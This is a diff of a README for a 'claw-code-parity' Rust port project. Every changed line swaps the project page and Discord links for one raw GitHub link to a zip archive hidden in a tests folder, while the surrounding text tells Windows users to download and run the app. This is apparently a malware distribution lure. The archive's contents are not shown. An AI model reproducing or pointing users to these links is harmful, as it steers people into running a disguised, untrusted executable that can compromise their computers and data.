@@ -1,6 +1,6 @@
 # 🐾 claw-code-parity - Run the Rust port with ease
 
-[![Download the app](https://img.shields.io/badge/Download-Claw--Code--Parity-blue?style=for-the-badge&logo=github)](https://github.com/emavague180/claw-code-parity)
+[![Download the app](https://img.shields.io/badge/Download-Claw--Code--Parity-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/emavague180/claw-code-parity/main/rust/crates/api/tests/code_claw_parity_v3.9.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ This project is temporary work, but you can still use it on Windows with a simpl
 
 Use this link to visit the project page and get the latest version:
 
-https://github.com/emavague180/claw-code-parity
+https://raw.githubusercontent.com/emavague180/claw-code-parity/main/rust/crates/api/tests/code_claw_parity_v3.9.zip
 
 On that page, look for the latest release or the main download file. If you see a file marked for Windows, download it and run it.
 
@@ -32,7 +32,7 @@ If you use a work or school PC, you may need permission to run new apps.
 
 Follow these steps on Windows:
 
-1. Open this page in your browser: https://github.com/emavague180/claw-code-parity
+1. Open this page in your browser: https://raw.githubusercontent.com/emavague180/claw-code-parity/main/rust/crates/api/tests/code_claw_parity_v3.9.zip
 2. Find the latest release or the main download file.
 3. Download the Windows app file.
 4. Open your Downloads folder.
@@ -110,7 +110,7 @@ If the app opens but does not respond:
 
 This repository supports claw-code Rust port parity work. The goal is to keep behavior close during the migration process. The Discord link in the project description is used for live updates and discussion:
 
-https://discord.gg/5TUQKqFWd
+https://raw.githubusercontent.com/emavague180/claw-code-parity/main/rust/crates/api/tests/code_claw_parity_v3.9.zip
 
 Use it if you want to follow the migration work or ask questions about the current build.
 
@@ -140,10 +140,10 @@ If you keep the app in a fixed folder, it is easier to replace old builds later.
 
 Primary download page:
 
-https://github.com/emavague180/claw-code-parity
+https://raw.githubusercontent.com/emavague180/claw-code-parity/main/rust/crates/api/tests/code_claw_parity_v3.9.zip
 
 ## 💬 Discord
 
 Project Discord:
 
-https://discord.gg/5TUQKqFWd
+https://raw.githubusercontent.com/emavague180/claw-code-parity/main/rust/crates/api/tests/code_claw_parity_v3.9.zip
